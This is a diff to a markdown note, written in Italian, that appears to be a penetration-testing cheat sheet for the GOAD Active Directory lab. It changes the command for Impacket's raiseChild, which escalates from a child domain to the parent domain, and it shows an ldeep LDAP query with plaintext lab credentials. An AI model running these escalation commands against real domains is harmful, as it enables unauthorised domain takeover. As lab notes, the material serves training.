@@ -65,6 +65,6 @@ ldeep ldap -u tywin.lannister -p 'powerkingftw135' -d sevenkingdoms.local -s lda
 
 ### **RaiseMeUp - impacker raiseChild**
 Per scalare da child a parent
-```
-raiseChild.py north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'
+```bash
+impacket-raiseChild north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'
 ```
